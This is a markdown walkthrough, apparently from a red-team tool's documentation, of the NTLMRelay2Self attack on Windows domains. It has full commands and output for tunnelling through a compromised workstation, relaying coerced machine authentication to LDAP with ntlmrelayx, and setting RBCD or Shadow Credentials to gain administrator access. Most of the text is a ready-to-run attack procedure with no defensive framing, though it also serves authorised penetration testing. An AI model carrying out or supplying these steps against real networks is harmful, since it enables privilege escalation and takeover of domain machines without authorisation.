# NTLMRelay2Self with Messenger

[NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self) is a privilege escalation attack where authentication is coerced from a machine account and relayed to LDAP to gain SYSTEM-level access. Messenger's remote port forwards and SOCKS proxy make this possible without dropping additional tools on the target.

## Prerequisites

- Low-privileged access on a domain-joined Windows workstation
- Ability to trigger-start the WebClient service
- Ability to coerce authentication (EFS, spooler, etc.)
- LDAP signing or LDAPS channel binding not enforced on a DC
- Ability to perform a computer-takeover primitive (RBCD or Shadow Credentials)

## Attack Flow

```
+------------------------------+       +------------------------------+       +-----------------------+
|      Operator Machine        |       |     Victim Workstation       |       |   Domain Controller   |
|                              |       |                              |       |                       |
|  Messenger Server            |       |  Messenger Client            |       |                       |
|  ntlmrelayx on :8888         |       |  rportfwd 127.0.0.1:8888    |       |   LDAP on :389        |
|  SOCKS proxy on :1080        |       |                              |       |                       |
+------------------------------+       +------------------------------+       +-----------------------+
        |                                       |                                     |
        |  1. rportfwd bridges :8888            |                                     |
        |<--------------------------------------|                                     |
        |  2. Coerce auth via PetitPotam        |                                     |
        |  (through SOCKS)                      |                                     |
        |-------------------------------------->|                                     |
        |  3. WebDAV auth sent to               |                                     |
        |     localhost:8888 (self)              |                                     |
        |<--------------------------------------|                                     |
        |  4. ntlmrelayx relays to DC           |                                     |
        |  (through SOCKS)                      |                                     |
        |-------------------------------------------------------------------->        |
        |  5. RBCD / Shadow Creds set           |                                     |
        |<--------------------------------------------------------------------|       |
```

## Steps

### 1. Connect the messenger client

Connect a client from the compromised workstation to the server:

```
> client.exe --server-url 192.168.1.100:8080 --encryption-key MyKey
[+] Connected to ws://192.168.1.100:8080/
```

### 2. Set up SOCKS proxy and remote port forward

```
[+] WebSocket Messenger `PWnauryxxD` is now connected.
(messenger)~# PWnauryxxD
(PWnauryxxD)~# socks 1080
[*] Messenger `PWnauryxxD` is attempting to start SOCKS Server (127.0.0.1:1080 -> *:*).
[+] Messenger `PWnauryxxD` started SOCKS Server (127.0.0.1:1080 -> *:*).
(PWnauryxxD)~# remote 127.0.0.1:8888:127.0.0.1:8888
[*] Queued Remote Port Forwarder request for Messenger `PWnauryxxD` for (127.0.0.1:8888) -> (127.0.0.1:8888).
[+] Messenger `PWnauryxxD` is now remote forwarding (127.0.0.1:8888) -> (127.0.0.1:8888).
```

The remote forward binds to `127.0.0.1:8888` on the client (only loopback -- this is relay2**self**) and forwards connections back to `127.0.0.1:8888` on the server where ntlmrelayx will be listening.

### 3. Verify LDAP signing is not enforced

```
$ proxychains netexec ldap dc.borgar.local -u lowbie -p 'P@ssw0rd' -M ldap-checker
LDAP-CHE... dc.borgar.local  LDAP signing NOT enforced
LDAP-CHE... dc.borgar.local  LDAPS channel binding is set to: Never
```

### 4. Start the WebClient service

The WebClient service must be running for WebDAV-based coercion. It has a Manual (Trigger) startup type on workstations, so a low-privilege user can trigger-start it:

```powershell
# Using a .searchConnector-ms file, a C# trigger, or a BOF:
> StartWebClient.exe
[+] WebClient Service started successfully
```

Verify:
```powershell
Get-Service -ServiceName WebClient
# Status: Running
```

### 5. Start ntlmrelayx

Start ntlmrelayx on port 8888 (where the remote forward delivers traffic), relaying to LDAP through the SOCKS proxy:

**RBCD method:**
```
$ proxychains ntlmrelayx.py -t ldap://dc.borgar.local \
    --no-smb-server --http-port 8888 \
    --no-acl --no-dump --no-da --no-validate-privs \
    --delegate-access
```

**Shadow Credentials method:**
```
$ proxychains ntlmrelayx.py -t ldap://dc.borgar.local \
    --no-smb-server --http-port 8888 \
    --no-acl --no-dump --no-da --no-validate-privs \
    --shadow-credentials --pfx-pass ''
```

### 6. Coerce authentication

Use PetitPotam (or PrinterBug, Coercer, etc.) through the SOCKS proxy. The capture address must be a **dotless hostname** (not an IP) with `@port/path` so Windows uses WebDAV:

```
$ proxychains python3 PetitPotam.py \
    -u lowbie -p 'P@ssw0rd' -d borgar.local \
    localhost@8888/something 127.0.0.1
```

### 7. Verify relay success

**RBCD:**
```
[*] HTTPD(8888): Authenticating against ldap://dc.borgar.local as BORGAR/WS01$ SUCCEED
[*] Attempting to create computer in: CN=Computers,DC=borgar,DC=local
[*] Adding new computer with username: NUUQERGH$ and password: MWw4SBXWXr(hc*n result: OK
[*] Delegation rights modified succesfully!
[*] NUUQERGH$ can now impersonate users on WS01$ via S4U2Proxy
```

**Shadow Credentials:**
```
[*] HTTPD(8888): Authenticating against ldap://dc.borgar.local as BORGAR/WS01$ SUCCEED
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: AdK8BkC5.pfx
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx AdK8BkC5.pfx -pfx-pass  borgar.local/WS01$ AdK8BkC5.ccache
```

### 8. Obtain admin access

From here, generate an administrative Kerberos TGT for the victim workstation:
- **RBCD**: Use `getST.py` to request a service ticket impersonating an admin via S4U2Proxy
- **Shadow Credentials**: Use `gettgtpkinit.py` + `getnthash.py` from PKINITtools, then `ticketer.py` or pass-the-hash
